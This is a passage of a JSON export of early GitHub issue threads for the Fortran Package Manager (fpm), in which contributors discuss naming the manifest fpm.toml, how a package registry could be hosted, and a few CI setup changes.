                    "text": "Thanks @ivan-pi for the ideas.\nI think a Rust package is simply called a crate, but even I am not 100% sure. For that reason I would recommend to simply call a package as a package, so that people know what that means.\nI agree, let's just use fpm.toml."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 03:28:15+00:00",
                    "text": "Should we close this now? We've implemented it as fpm.toml."
                },
                {
                    "user": "certik",
                    "date": "2020-04-30 05:25:31+00:00",
                    "text": "Yes, can be closed.\n\u2026\nOn Wed, Apr 29, 2020, at 9:28 PM, Brad Richardson wrote:\n\n\n Should we close this now? We've implemented it as `fpm.toml`.\n\n \u2014\n You are receiving this because you authored the thread.\n Reply to this email directly, view it on GitHub\n <#5 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWEQACM33QVEE66CTT3RPDV5XANCNFSM4KGNRUOQ>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-04-30 14:05:50+00:00",
                    "text": "Ok, closing."
                }
            ]
        },
        {
            "number": 4,
            "user": "certik",
            "date": "2020-01-14 06:07:30+00:00",
            "title": "Hosting of packages",
            "text": "Eventually we need to have a central place for packages similar to crates.io.\nBut for now we will use a git repository (GitHub, GitLab and other places will work) as well as just url for a tarball. That way we don't need to host anything ourselves at first and can get the initial community and ecosystem of packages built up without worrying about security and other issues that will come with maintaining our own repository.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 03:26:22+00:00",
                    "text": "Although worthwhile thinking ahead, I think we are far from this. It's a big technical challenge that requires dedicated hardware and person (people) if it's to work smoothly.\nIn the interim, as you describe, we can maintain a registry that provides all the info about available packages that fpm needs, but the source code of packages is hosted wherever its hosted by the package maintainers (GitHub, GitLab, custom url, whatever). The downside to this approach is that if the maintainer takes down the package, or changes the url, or GitHub is down, the package is unavailable through fpm. I think these are edge cases that we can live with and work around for a while, especially considering that Fortran's ecosystem is still fledgling.\nLet's discuss what would the registry look like. How about if we maintain a registry of fpm.toml files for each supported package in fpm's repo. Something like this:\nfpm/\n  Registry/\n    blas/\n      fpm.toml\n    lapack/\n      fpm.toml\n    stdlib/\n      fpm.toml\n    ...\n\nfpm.toml for a package includes all the info that fpm would need to build the package, including but not limited to:\n\nBuild backend such as CMake, autotools, or plan make\nGitHub, GitLab or custom url from which to download source code\nVersions available\nDependencies\nWhat else?\n\nFor a maintainer to add their package to fpm, they would open a PR in fpm to add their fpm.toml to the fpm Registry.\nAm I going in the right direction?"
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 05:13:52+00:00",
                    "text": "Actually, the registry would be just a list of urls to download the package, so:\nhttps://github.com/certik/lapack.fpm\nhttps://github.com/fortran-lang/stdlib\n...\n\nEach of these urls will be either a tarball, or a git repository. When you download it, it contains the fpm.toml file with all the metadata. And we'll have code that will simply download each package and extract the metadata to create a nice (static) webpage and to allow to search from a command line (fpm search) --- we can automatically prepare some JSON file with package name / description / url, etc., and host it at some github repo, and fpm would simply download it. (The registry might be a combination of version + url, because a single package can have multiple verisons, so one would use, e.g., git tags for different versions.)\nRegarding the design of fpm, I would do exactly what Rust does. So a standard layout (which however can be disabled if you don't like it from Cargo.toml), pure Rust is automatic, non-Rust parts are compiled by hand by writing a build script (and listing it in Cargo.toml, then Cargo executes it before building Rust parts). From the build script you can call cmake or whatever build system one wants."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 14:38:34+00:00",
                    "text": "Can you explain why you need a separate (middle-man) repo for metadata, per package?\nIf fpm gets metadata from one repo, which would then instruct it to download the package tarball from a custom url and build it with some commands, then it would have to do that transaction every time you inquire about a package. To not query a remote repo on every command, you'd want to cache results, which basically means you'd be building a local registry of packages. But if you're building a local registry of packages, you might as well maintain the registry in one repo.\nMore problematically, without a local (or remote but aggregated) registry, how do you search for available packages? With Cargo I can do:\n$ cargo search blas\nblas = \"0.20.0\"                   # The package provides wrappers for BLAS (Fortran).\ncoaster-blas = \"0.2.0\"            # Coaster library for full BLAS support\nrust-blas = \"0.1.1\"               # BLAS bindings and wrappers, fork of rblas\ncollenchyma-blas = \"0.2.0\"        # Collenchyma library for full BLAS support\nblas-src = \"0.4.0\"                # The package provides a BLAS source of choice.\nrblas = \"0.0.13\"                  # BLAS bindings and wrappers\nblas-sys = \"0.7.1\"                # The package provides bindings to BLAS (Fortran).\ncuda_blas = \"0.1.0\"               # cuBLAS API bindings.\npopcorn-blas = \"0.1.0\"            # Popcorn BLAS: Broadcasting BLAS operations for Popcorn\nnetlib-blas-provider = \"0.0.8\"    # BLAS/LAPACK provider using the Netlib implementation\n... and 54 crates more (use --limit N to see more)\n\nWould fpm search only list urls? Or would it try to fetch metadata from any number of repos that match the pattern? This won't scale.\nLooking at my local .cargo/ directory, it doesn't seem like Cargo keeps an index of all packages locally (for many many packages this doesn't scale either) but fetches from a remote registry (I assume cargo.io)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-01-15 14:42:22+00:00",
                    "text": "Regarding the design of fpm, I would do exactly what Rust does. So a standard layout (which however can be disabled if you don't like it from Cargo.toml), pure Rust is automatic, non-Rust parts are compiled by hand by writing a build script (and listing it in Cargo.toml, then Cargo executes it before building Rust parts). From the build script you can call cmake or whatever build system one wants.\n\nAre you saying that for pure Fortran code (like stdlib at the moment), you wouldn't use a build system but do the build explicitly by directly invoking the compiler? In the long run I think this is a good choice but I'm worried that it'd be a big ordeal to implement because now you have to worry about building dependency trees and all the necessary stuff that CMake was doing for us.\nOr, are you thinking about generating a CMakeLists.txt based on the scan of the source files and directories? Seems complex too."
                },
                {
                    "user": "certik",
                    "date": "2020-01-15 15:37:45+00:00",
                    "text": "Or, are you thinking about generating a CMakeLists.txt based on the scan of the source files and directories? Seems complex too.\n\nYes, that's how it is already implemented in this very small prototype of fpm. If you look here:\nhttps://github.com/fortran-lang/fpm/tree/master/tests/1\nAll you have to do is execute fpm build in that directory, and it will generate the proper CMakeLists.txt and build it and then fpm run will run the executable.\nThat's exactly how Cargo does it, and I think that's what we want also.\nAnd yes, I agree with you that using CMake as the vehicle to actually build it is the way to go initially. All fpm has to do is to construct it properly.\nIt already works, and my next step is to start doing the dependencies. Once we have a prototype of that, let's brainstorm how to host it properly. (Yes, I want fpm search to list names and descriptions just like Cargo does, so it needs to download some JSON description of all packages --- But what I am arguing is to maintain such JSON description automatically, not by hand, by downloading it from the actual packages --- we can discuss it later.)"
                }
            ]
        },
        {
            "number": 3,
            "user": "certik",
            "date": "2020-01-14 06:02:10+00:00",
            "title": "Remove GitLab-CI",
            "text": "We will use GitHub and its CI from now on.",
            "comments": []
        },
        {
            "number": 2,
            "user": "certik",
            "date": "2020-01-14 05:43:25+00:00",
            "title": "Build and run Rust tests",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 06:00:39+00:00",
                    "text": "Tests pass, merging."
                }
            ]
        },
        {
            "number": 1,
            "user": "certik",
            "date": "2020-01-14 05:38:24+00:00",
            "title": "Add GitHub CI",
            "text": "",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-01-14 05:40:20+00:00",
                    "text": "I think it has to be merged first in order to run."
                }
            ]
        }
    ]
}